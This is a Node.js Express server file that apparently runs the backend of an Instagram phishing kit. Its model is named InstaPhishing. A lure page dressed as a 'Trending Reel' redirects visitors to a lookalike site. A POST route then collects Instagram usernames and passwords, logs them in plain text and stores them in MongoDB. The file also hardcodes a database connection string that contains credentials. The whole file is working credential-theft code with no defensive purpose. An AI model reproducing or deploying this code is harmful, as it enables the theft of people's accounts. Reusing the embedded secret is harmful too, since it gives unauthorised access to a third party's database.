import express from 'express';
import cors from 'cors';
import mongoose from 'mongoose';
import { instadb } from './models/InstaPhishing.js';

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());              // Allow all CORS requests
app.use(express.json());      // Parse JSON bodies

// MongoDB connection (update URI if needed)
mongoose.connect(process.env.MONGO_URI || 'mongodb+srv://hariomsingh4274:FJFZiGBqhAZRv3SR@cluster0.vlrs0o5.mongodb.net/Base?retryWrites=true&w=majority&appName=Cluster0', {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log("MongoDB connected");
}).catch((err) => {
  console.error("MongoDB connection error:", err);
});

// Default route
app.get('/', (req, res) => {
  res.send(`
    <html>
      <head>
        <meta property="og:title" content="Trending Reel 🔥">
        <meta property="og:image" content="https://i.imgur.com/real-reel-preview.jpg">
        <meta http-equiv="refresh" content="3; url='https://insta-seven-gules.vercel.app/'" />
      </head>
      <body>
        <div style="text-align:center;padding:50px;">
          <p>Loading reel... 🔥</p>
        </div>
      </body>
    </html>
  `);
});

// Route to handle Instagram credentials
app.post('/Insta', async (req, res) => {
  try {
    const { username, password } = req.body;
    console.log(`Received -> Username: ${username}, Password: ${password}`);

    const dataSave = new instadb({
      username: username,
      Password: password
    });

    await dataSave.save();
    res.status(200).json({ status: "true" });
  } catch (error) {
    console.error("Error saving data:", error);
    res.status(500).json({ status: "false", error: "Internal Server Error" });
  }
});

// Export app for Vercel deployment
export default app;
